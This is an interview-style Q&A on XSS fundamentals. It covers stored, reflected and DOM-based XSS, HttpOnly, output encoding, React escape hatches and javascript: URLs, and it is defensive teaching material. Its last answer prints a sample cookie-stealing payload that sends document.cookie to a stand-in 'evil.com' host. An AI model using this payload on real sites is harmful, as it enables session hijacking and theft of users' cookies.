# Interview Q&A — XSS and Injection Fundamentals

**Q: What's the fundamental difference between stored and reflected XSS?**
Stored XSS persists the payload server-side (a database, a file) and serves it to every subsequent viewer of the affected page passively. Reflected XSS never persists anything — the payload rides along in the current request (typically a URL query param) and the server reflects it directly back into that one response, requiring the attacker to get a specific victim to click a crafted link.

**Q: Why can DOM-based XSS exist even on a server that does everything right?**
Because the vulnerable data flow — an attacker-controllable source (`location.hash`, `location.search`, `document.referrer`) reaching a dangerous sink (`innerHTML`, `eval`, `document.write`) — happens entirely within client-side JavaScript. The server can serve a perfectly static, unmodified page and the vulnerability still exists purely in how the client-side code processes URL/browser data.

**Q: Does `HttpOnly` prevent XSS?**
No. It doesn't prevent the injection or execution of a script at all — it only prevents that script, once running, from reading the flagged cookie via `document.cookie`. An XSS payload can still manipulate the DOM, make authenticated requests using the live session (cookies are still attached to same-origin requests by the browser), or exfiltrate other page data even with `HttpOnly` set.

**Q: What's the single most reliable defense against XSS, and why isn't a WAF/input filter enough on its own?**
Output encoding at the point of insertion — HTML-entity-encoding for HTML contexts, URL-encoding for URLs, JS-string-encoding for inline scripts — because it's applied at the exact boundary where untrusted data becomes executable, regardless of how that data got there. Input filtering/WAFs can be bypassed (encoding tricks, unusual payload constructions) and don't protect against every possible path data can take to reach a sink (e.g. data written by an internal tool, not just a public form).

**Q: If a React app uses `{value}` JSX interpolation everywhere, is it immune to XSS?**
Not entirely. JSX auto-escapes text content by default, which closes the most common injection point, but any explicit escape hatch — `dangerouslySetInnerHTML`, directly manipulating the DOM via a `ref` and setting `innerHTML`, or an `href`/`src` attribute set to an unsanitized `javascript:` URL — reopens the same vulnerability class. Framework defaults reduce risk; they don't eliminate the need to think about untrusted data at every explicit "render as HTML" or "render as executable" point.

**Q: What's a `javascript:` URL XSS vector, concretely?**
```html
<a href="javascript:fetch('https://evil.com/steal?c='+document.cookie)">Click here</a>
```
If an app lets user input populate an `href` (or `src`) attribute without validating the scheme, an attacker can supply a `javascript:` URL instead of a normal `http(s)://` one — clicking the link executes arbitrary script. The fix is validating/allowlisting the URL scheme before rendering it into an `href`/`src`, not just escaping HTML entities (which doesn't touch this vector at all, since the string is syntactically valid as an attribute value).
